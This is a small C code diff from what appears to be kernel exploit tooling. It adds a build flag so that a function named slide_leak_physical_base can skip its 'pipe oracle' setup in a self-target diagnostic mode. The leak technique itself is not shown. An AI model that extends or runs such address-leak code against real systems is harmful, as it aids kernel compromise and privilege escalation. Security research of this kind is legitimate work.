@@ -1331,10 +1331,15 @@ int app_trigger_fops_slide_route(void) {
 
 static int slide_leak_physical_base(void) {
   size_t started = gettime_ns();
+#if defined(APP_SLIDE_SELF_TARGET_SKIP_PIPE_ORACLE) && \
+    APP_SLIDE_SELF_TARGET_SKIP_PIPE_ORACLE
+  pr_info("p0 self-target diagnostic skipping unused pipe oracle\n");
+#else
   if (!prepare_p0_pipe_oracle()) {
     pr_error("p0 physical pipe preparation failed\n");
     return 0;
   }
+#endif
 #if defined(APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS) && \
     APP_KERNEL_PAGE_DIAGNOSTIC_CHECKPOINTS
   pr_info("p0 diagnostic stage=kernel-page-prepare-enter "
